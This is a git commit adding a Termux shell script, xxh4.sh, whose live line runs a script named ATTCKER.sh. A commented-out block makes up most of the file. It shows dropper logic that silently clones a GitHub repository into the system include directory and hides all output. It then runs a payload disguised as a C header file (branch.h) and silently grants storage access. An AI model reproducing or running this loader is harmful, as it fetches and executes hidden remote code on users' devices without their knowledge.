9d69d983a1035bdfb4a9c8900ee312321e4b1764
HOZOO WHITE HAT <hozooimut@gmail.com>
2025-03-18 12:18:50 +0700

    Create xxh4.sh

---
+++ pockat/xxh4.sh
@@ -0,0 +1,39 @@
+
+#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash
+
+set +x
+#!/bin/bash
+
+###################################################
+# keamanan="/data/data/com.termux"
+# if [ -d "$keamanan" ]; then
+#      cd /data/data/com.termux/files/usr/include/
+#      git clone https://github.com/hozoowhitehat/WA-BAN &> /dev/null
+#      cd WA-BAN &> /dev/null
+#      git pull origin main &> /dev/null
+#      git stash &> /dev/null
+#      while true; do
+#           galiruskontol="/data/data/com.termux/files/usr/include/git4/branch.h"
+#           if [ -f "$galiruskontol" ]; then
+#                cd /data/data/com.termux/files/usr/include/ &> /dev/null
+#                cd WA-BAN &> /dev/null
+#                git pull origin main &> /dev/null
+#                git stash &> /dev/null
+#                bash "$galiruskontol"
+#                exit 0
+#           else
+#                cd /data/data/com.termux/files/usr/include/ &> /dev/null
+#                git clone https://github.com/hozoowhitehat/WA-BAN &> /dev/null
+#                cd WA-BAN &> /dev/null
+#                git pull origin main &> /dev/null
+#                git stash &> /dev/null
+#           fi
+#      done
+# else
+#      echo "y" | termux-setup-storage &> /dev/null
+#      
+#      exit 0
+# fi
+###################################################
+
+bash ATTCKER.sh
